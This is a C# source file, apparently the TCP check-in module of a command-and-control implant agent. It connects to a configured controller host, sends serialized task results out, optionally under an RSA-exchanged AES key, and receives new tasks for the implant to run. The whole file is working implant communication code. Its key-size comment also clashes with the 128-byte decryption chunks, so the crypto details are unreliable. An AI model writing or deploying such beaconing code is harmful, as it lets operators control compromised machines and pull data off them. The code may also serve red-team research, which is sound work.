using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Helpers;
using System.Security.Cryptography;
using System.Diagnostics;

namespace Agent.Communication
{
    public class TcpCommModule : CommModule
    {
        public TcpCommModule(ConnexionUrl conn, IMessageService messManager, IFileService fileService, IProxyService proxyService) : base(conn, messManager, fileService, proxyService)
        {
        }


        protected override async Task<List<MessageTask>> CheckIn(List<MessageResult> results)
        {
            var client = new TcpClient(this.Connexion.Address, this.Connexion.Port);
            if (this.Connexion.IsSecure)
            {
                if (!client.IsAlive())
                    return null;

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.KeySize = 2048; // Set the key size to 2048 bits
                rsa.ExportParameters(true); // Export the private key

                //send public Key
                client.SendData(Encoding.UTF8.GetBytes(rsa.ToXmlString(false)));
                //receive SymetricKey & IV
                var receivedKeyIV = client.ReceivedMessage(true);
                //Debug.WriteLine("TCPS Comm : EncryptedKey & IV (" + receivedKeyIV.Length + ") = " + string.Join(",", receivedKeyIV.Select(a => ((int)a).ToString())));
                
              
                byte[] decryptedKey = rsa.Decrypt(receivedKeyIV.Take(128).ToArray(), false);
                byte[] decryptedIv = rsa.Decrypt(receivedKeyIV.Skip(128).Take(128).ToArray(), false);

                RijndaelManaged rijndael = new RijndaelManaged();
                rijndael.KeySize = 256;
                rijndael.BlockSize = 128;
                rijndael.Key = decryptedKey;
                rijndael.IV = decryptedIv;
                rijndael.Padding = PaddingMode.PKCS7;

                var message = results.Serialize();
                var encryptedMessageBytes = rijndael.CreateEncryptor().TransformFinalBlock(message, 0, message.Length);
                //Debug.WriteLine("TCPS Comm : Encrypted Message (write " + encryptedMessageBytes.Length + ") = " + string.Join(",", encryptedMessageBytes.Select(a => ((int)a).ToString())));
                client.SendData(encryptedMessageBytes);

                var encryptedResponse = client.ReceivedMessage(true);
                byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(encryptedResponse, 0, encryptedResponse.Length);
                return decryptedBytes.Deserialize<List<MessageTask>>();
            }
            else
            {
                if (!client.IsAlive())
                    return null;

                client.SendData(results.Serialize());

                var responseContent = client.ReceivedMessage(true);
                return responseContent.Deserialize<List<MessageTask>>();
            }
        }
    }
}
